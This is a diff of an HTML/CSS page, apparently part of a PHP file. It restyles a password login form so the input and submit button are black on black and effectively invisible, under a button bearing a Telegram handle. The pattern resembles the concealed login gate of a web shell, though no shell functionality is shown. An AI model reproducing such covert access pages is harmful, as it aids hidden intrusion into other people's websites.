@@ -59,39 +59,48 @@ else
             display: none;
             margin-top: 20px;
         }
-        #showButton {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background-color: black; /* Warna hitam agar tombol tidak terlihat */
-            color: black; /* Warna teks hitam agar tombol tidak terlihat */
-            border: 1px solid black; /* Border hitam agar tombol tidak terlihat */
+        button {
+            background-color: black; /* Warna hitam seperti background */
+            color: white; /* Warna teks putih agar terlihat */
+            border: 1px solid black; /* Border hitam */
             padding: 5px 10px;
             cursor: pointer;
-            visibility: hidden; /* Tombol tidak terlihat */
         }
-        #showButton.visible {
-            visibility: visible; /* Tombol terlihat jika memiliki class 'visible' */
+        button:hover {
+            background-color: black; /* Efek hover untuk tombol */
+        }
+        #password {
+            background-color: black; /* Warna latar belakang hitam */
+            color: black; /* Warna teks putih */
+            border: 1px solid black; /* Border putih untuk kontras */
+            padding: 5px;
+        }
+        #passwordForm input[type="submit"] {
+            background-color: black; /* Warna latar belakang hitam */
+            color: black; /* Warna teks putih */
+            border: 1px solid black; /* Border putih untuk kontras */
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        #passwordForm input[type="submit"]:hover {
+            background-color: black; /* Efek hover untuk tombol submit */
         }
     </style>
     <script>
         function togglePasswordForm() {
             var form = document.getElementById('passwordForm');
-            var button = document.getElementById('showButton');
             if (form.style.display === 'none' || form.style.display === '') {
                 form.style.display = 'block';
-                button.classList.remove('visible'); // Menyembunyikan tombol setelah mengklik
+            } else {
+                form.style.display = 'none';
             }
         }
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('showButton').classList.add('visible');
-        });
     </script>
 </head>
 <body>
     <center>
         <pre><img src="https://imgur.com/48YgDZL.png" width="250" height="250" /></pre>
-        <button id="showButton" onclick="togglePasswordForm()">t.me/SomsakKittisak</button>
+        <button onclick="togglePasswordForm()">>> t.me/SomsakKittisak <<</button>
         <form id="passwordForm" action="" method="POST">
             <label for="password"></label> 
             <input id="password" name="password" type="password">
